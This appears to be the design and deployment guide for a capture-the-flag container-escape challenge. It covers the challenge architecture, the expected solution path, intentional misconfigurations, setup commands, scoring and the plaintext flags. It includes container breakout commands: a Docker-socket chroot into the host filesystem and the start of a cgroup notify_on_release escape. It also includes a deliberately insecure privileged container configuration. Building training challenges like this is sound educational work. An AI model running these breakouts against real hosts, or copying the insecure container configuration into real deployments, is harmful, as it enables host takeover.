# 🐳 Round 2 PWN Challenge - Container Escape

## 📋 Challenge Overview

**Domain:** `container.hashx`  
**Difficulty:** Advanced  
**Type:** Binary Exploitation, Container Security  
**Flags:** 2 (User Flag + Root Flag)  

---

## 🎯 Challenge Description

Players are placed inside a **misconfigured containerized environment** requiring multi-stage exploitation to capture both flags.

### Learning Objectives:
- Container security fundamentals
- Docker misconfiguration exploitation
- Privilege escalation techniques
- Container breakout methods
- Web service vulnerability identification

---

## 🏗️ Infrastructure Architecture

```
container.hashx (Isolated Server)
│
├── Vulnerable Web Service (Port 80/443)
│   ├── Entry point for initial access
│   ├── Weak authentication or RCE vulnerability
│   └── Leads to container shell access
│
├── Docker Container Environment
│   ├── User-level access after web exploit
│   ├── USER FLAG location (inside container)
│   ├── Docker misconfigurations:
│   │   ├── Privileged mode or excessive capabilities
│   │   ├── Docker socket mounted (/var/run/docker.sock)
│   │   ├── Host filesystem mounts
│   │   └── Weak container permissions
│   │
│   └── Breakout vectors available
│
└── Host System
    └── ROOT FLAG location (after container escape)
```

---

## 🔓 Attack Path (Expected Solution)

### Stage 1: Initial Access → User Flag

**Objective:** Exploit web service and gain container shell

**Steps:**
1. **Reconnaissance**
   ```bash
   # Port scanning
   nmap -sV container.hashx
   
   # Web service enumeration
   dirb http://container.hashx /usr/share/wordlists/dirb/common.txt
   ```

2. **Web Service Exploitation**
   - Identify vulnerability (SQLi, RCE, file upload, etc.)
   - Exploit to gain shell access
   - Stabilize shell (TTY upgrade)

3. **Container Enumeration**
   ```bash
   # Check if inside container
   ls -la /.dockerenv
   cat /proc/1/cgroup | grep docker
   
   # Find user flag
   find / -name "*flag*" 2>/dev/null
   find / -name "user.txt" 2>/dev/null
   ```

4. **Capture User Flag**
   ```bash
   cat /home/ctfuser/user.txt
   # Flag format: MEDUSA{user_level_access_achieved}
   ```

---

### Stage 2: Privilege Escalation → Root Flag

**Objective:** Escape container and gain host root access

**Method 1: Docker Socket Exploitation**
```bash
# Check for Docker socket
ls -la /var/run/docker.sock

# If socket is accessible, spawn privileged container
docker run -v /:/hostfs -it alpine chroot /hostfs bash

# Access host filesystem
cat /hostfs/root/root.txt
```

**Method 2: Privileged Container**
```bash
# Check container capabilities
capsh --print
cat /proc/self/status | grep Cap

# If CAP_SYS_ADMIN is present
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release

# Breakout script (see detailed exploit)
```

**Method 3: Host Path Mount**
```bash
# Check for host mounts
mount | grep /host
df -h | grep /host

# If host filesystem is mounted
cd /host/root
cat root.txt
```

**Method 4: Kernel Exploit (Advanced)**
```bash
# Check kernel version
uname -a

# Search for known exploits
searchsploit linux kernel 5.x

# Compile and run exploit
```

5. **Capture Root Flag**
   ```bash
   cat /root/root.txt  # On host system
   # Flag format: MEDUSA{container_breakout_master}
   ```

---

## 🛡️ Intentional Vulnerabilities

### Web Service Layer
- [ ] SQL Injection in login form
- [ ] Remote Code Execution (RCE) via file upload
- [ ] Command injection in web form
- [ ] Path traversal leading to sensitive files
- [ ] Weak/default credentials

### Container Misconfigurations
- [ ] Docker socket mounted (`-v /var/run/docker.sock:/var/run/docker.sock`)
- [ ] Privileged mode (`--privileged`)
- [ ] Excessive capabilities (`--cap-add=SYS_ADMIN`)
- [ ] Host filesystem mount (`-v /:/hostfs`)
- [ ] No security profiles (AppArmor/SELinux disabled)
- [ ] Weak user permissions

### System Level
- [ ] Vulnerable kernel version
- [ ] Writable cgroup notify_on_release
- [ ] procfs exposed with sensitive information
- [ ] Weak file permissions on critical files

---

## 🎮 Challenge Deployment Guide

### 1. Server Setup

```bash
# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Create vulnerable container
docker run -d \
  --name ctf-pwn-challenge \
  --privileged \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /:/hostfs \
  -p 80:80 \
  vulnerable-web-app:latest

# Or with docker-compose
```

### 2. Docker Compose Configuration

```yaml
version: '3.8'

services:
  vulnerable-web:
    image: vulnerable-web-app:latest
    container_name: ctf-pwn-challenge
    privileged: true
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - /:/hostfs:ro  # Read-only host mount
    ports:
      - "80:80"
      - "443:443"
    environment:
      - USER_FLAG=MEDUSA{user_level_access_achieved}
    restart: unless-stopped
    
  # Auto-reset service (cleans up every 30 minutes)
  auto-reset:
    image: alpine:latest
    command: sh -c "while true; do sleep 1800; docker restart ctf-pwn-challenge; done"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
```

### 3. Flag Placement

```bash
# User flag (inside container)
docker exec ctf-pwn-challenge bash -c \
  'echo "MEDUSA{user_level_access_achieved}" > /home/ctfuser/user.txt && \
   chmod 644 /home/ctfuser/user.txt'

# Root flag (on host)
sudo bash -c 'echo "MEDUSA{container_breakout_master}" > /root/root.txt'
sudo chmod 600 /root/root.txt
```

### 4. Network Configuration

```bash
# Configure subdomain
# DNS A record: container.hashx → Server IP

# Nginx reverse proxy (optional)
server {
    listen 80;
    server_name container.hashx;
    
    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### 5. Security Hardening (Host)

```bash
# Firewall rules (limit outbound)
sudo ufw default deny outgoing
sudo ufw allow out 80/tcp
sudo ufw allow out 443/tcp
sudo ufw allow out 53
sudo ufw enable

# Resource limits
sudo systemctl set-property docker.service MemoryLimit=2G
sudo systemctl set-property docker.service CPUQuota=50%

# Monitoring
docker stats --no-stream
```

---

## 🔍 Flag Validation

### Backend Integration

Both PWN challenge flags are submitted through the main platform API:

```javascript
// backend/routes/flag.js already handles this

// User flag submission
POST /api/flag/submit
{
  "flag": "MEDUSA{user_level_access_achieved}",
  "round": 2,
  "challengeType": "pwn"
}

// Root flag submission  
POST /api/flag/submit
{
  "flag": "MEDUSA{container_breakout_master}",
  "round": 2,
  "challengeType": "pwn"
}

// Both validated against ROUND2_PWN_FLAG environment variable
// Platform handles: rate limiting, attempt counting, point calculation
```

**Note:** The PWN challenge flags are stored in `.env`:
```bash
ROUND2_PWN_FLAG=MEDUSA{your_pwn_flag_here}
```

**Security:** The platform only validates if submitted flag matches. Teams discover flags by exploiting container.hashx infrastructure.

---

## 📊 Difficulty & Points

| Stage | Task | Points | Difficulty |
|-------|------|--------|------------|
| Stage 1 | Web Service Exploit | 400 | Medium |
| Stage 1 | User Flag Capture | 400 | Medium |
| Stage 2 | Container Analysis | 300 | Hard |
| Stage 2 | Privilege Escalation | 500 | Hard |
| Stage 2 | Root Flag Capture | 600 | Very Hard |
| **Total** | **Complete Challenge** | **2200** | **Advanced** |

---

## 🚨 Security Considerations

### For Challenge Infrastructure:

1. **Network Isolation**
   - PWN challenge on separate server/VPS
   - No direct database access to main platform
   - Firewall rules prevent lateral movement

2. **Resource Limits**
   - Memory limit: 2GB per container
   - CPU limit: 50% of available
   - Disk quota: 10GB maximum
   - Connection limits: 100 concurrent

3. **Monitoring & Alerts**
   ```bash
   # Monitor resource usage
   docker stats
   
   # Log container escapes for analysis
   journalctl -u docker -f | grep "container.*escape"
   
   # Alert on high CPU/Memory
   # Alert on unusual outbound traffic
   ```

4. **Auto-Reset Mechanism**
   - Reset containers every 30 minutes
   - Clean up abandoned processes
   - Restore flag files if deleted

5. **Attack Surface Limitation**
   - Only ports 80/443 exposed externally
   - SSH disabled or key-only
   - No unnecessary services running

---

## 🎓 Educational Value

### Skills Developed:

**Beginner to Intermediate:**
- Web vulnerability identification
- Basic container concepts
- Linux command line proficiency
- File system navigation

**Intermediate to Advanced:**
- Docker architecture understanding
- Container security analysis
- Privilege escalation techniques
- Kernel exploitation awareness

**Advanced:**
- Container breakout methods
- Capability-based attacks
- cgroup manipulation
- Real-world infrastructure security

---

## 📚 Resources for Participants

**Recommended Reading:**
- Docker Security Best Practices
- Container Breakout Techniques (HackTricks)
- Linux Privilege Escalation Guide
- Docker Socket Exploitation

**Tools:**
- `docker` CLI
- `nmap`, `dirb`, `gobuster`
- Metasploit Framework
- LinPEAS (Linux Privilege Escalation)
- Docker exploitation scripts

---

## 🔄 Challenge Maintenance

### Daily Tasks:
- [ ] Check container health
- [ ] Verify flags are in place
- [ ] Monitor resource usage
- [ ] Review logs for issues

### Weekly Tasks:
- [ ] Update vulnerable components (if needed)
- [ ] Analyze successful exploits
- [ ] Adjust difficulty if necessary
- [ ] Backup server state

### Incident Response:
- Container completely destroyed → Auto-reset
- Service down → Automatic restart
- Excessive resource usage → Kill and restart
- Platform compromise suspected → Isolate and investigate

---

## 📞 Support & Troubleshooting

**Common Issues:**

1. **Container Won't Start**
   ```bash
   docker logs ctf-pwn-challenge
   docker system prune
   docker-compose up -d --force-recreate
   ```

2. **Flags Missing**
   ```bash
   # Re-place flags
   ./deploy-flags.sh
   ```

3. **Performance Degradation**
   ```bash
   # Check resources
   docker stats
   htop
   
   # Restart challenge
   docker restart ctf-pwn-challenge
   ```

---

**Challenge Status:** ✅ Designed and Ready for Deployment  
**Security Level:** Intentionally Vulnerable (Isolated)  
**Expected Completion Time:** 2-4 hours (experienced), 4-8 hours (learning)

---

## 🎯 Success Metrics

Track these metrics for challenge improvement:

- Completion rate (how many teams solve it)
- Average time to user flag
- Average time to root flag
- Common stuck points
- Most popular exploit methods
- Resource usage patterns

**Adjust difficulty** based on metrics after first competition.

---

**END OF PWN CHALLENGE DOCUMENTATION**
